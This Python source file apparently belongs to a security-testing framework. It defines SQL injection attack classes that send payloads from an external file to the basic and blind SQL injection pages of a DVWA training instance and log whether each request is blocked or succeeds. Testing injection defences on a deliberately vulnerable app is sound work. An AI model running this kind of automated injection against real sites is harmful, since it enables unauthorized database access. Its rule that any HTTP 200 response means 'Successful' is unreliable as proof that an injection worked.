from attacks.baseClass import AttackSession
from pathlib import Path
import urllib.parse
from utilities.report import eventHandler

class sqlInjection(AttackSession):
    def __init__(self, host, authenticationPath, authPayload):
        super().__init__(host, authenticationPath, authPayload)

    def authentication(self):
        return super().authentication()
    def attack():
        pass
    def startAttack(self):
        sqlInjectionBasic("http://web-dvwa.example.com:30064/",'login.php',self.authPayload).startAttack()
        sqlInjectionBlind("http://web-dvwa.example.com:30064/",'login.php',self.authPayload).startAttack()

 

class sqlInjectionBasic(AttackSession):
    events = eventHandler()
    events.connect(events.callback,sender="SQL Injection Basic")
    def __init__(self, host, authenticationPath, authPayload):
        super().__init__(host, authenticationPath, authPayload)
    
    def authentication(self):
        return super().authentication()
    
    def attack(self,session):
        base_path = Path(__file__)
        file_path = (base_path / "../../payloads/sqlinjection.txt").resolve()
        with open(file_path,mode='r',encoding="ISO-8859-1") as f:
            while line := f.readline():
                url = self.host + "vulnerabilities/sqli/?id="+urllib.parse.quote(line.strip(),safe='')+"&Submit=Submit"
                try:
                    response = session.get(url)
                    if response.status_code == 403:
                        self.events.sendMessage("Blocked","SQL Injection Basic",line.strip())
                    elif response.status_code == 200:
                        self.events.sendMessage("Successful","SQL Injection Basic",line.strip())
                except:
                    self.events.sendMessage("Error","SQL Injection Basic","Error on server")
                    
                    
        f.close()
    def startAttack(self):
        self.events.sendMessage("Information","SQL Injection Basic","Attack started")
        self.attack(self.authentication())
        self.events.sendMessage("Information","SQL Injection Basic","Attack completed")
        self.events.disconnect(self.events.callback,sender="SQL Injection Basic")


class sqlInjectionBlind(AttackSession):
    events = eventHandler()
    events.connect(events.callback,sender="SQL Injection Blind")
    def __init__(self, host, authenticationPath, authPayload):
        super().__init__(host, authenticationPath, authPayload)
    
    def authentication(self):
        return super().authentication()
    
    def attack(self,session):
        base_path = Path(__file__)
        file_path = (base_path / "../../payloads/sqlinjection.txt").resolve()
        with open(file_path,mode='r',encoding="ISO-8859-1") as f:
            while line := f.readline():
                url =  self.host + "vulnerabilities/sqli_blind/?id="+urllib.parse.quote(line.strip(),safe='')+"&Submit=Submit"
                try:
                    response = session.get(url)
                    if response.status_code == 403:
                        self.events.sendMessage("Blocked","SQL Injection Blind",line.strip())
                    elif response.status_code == 200:
                        self.events.sendMessage("Successful","SQL Injection Blind",line.strip())
                except:
                    self.events.sendMessage("Error","SQL Injection Blind","Error on server")
                    
        f.close()
    def startAttack(self):
        self.events.sendMessage("Information","SQL Injection Blind","Attack started")
        self.attack(self.authentication())
        self.events.sendMessage("Information","SQL Injection Blind","Attack completed")
        self.events.disconnect(self.events.callback,sender="SQL Injection Blind")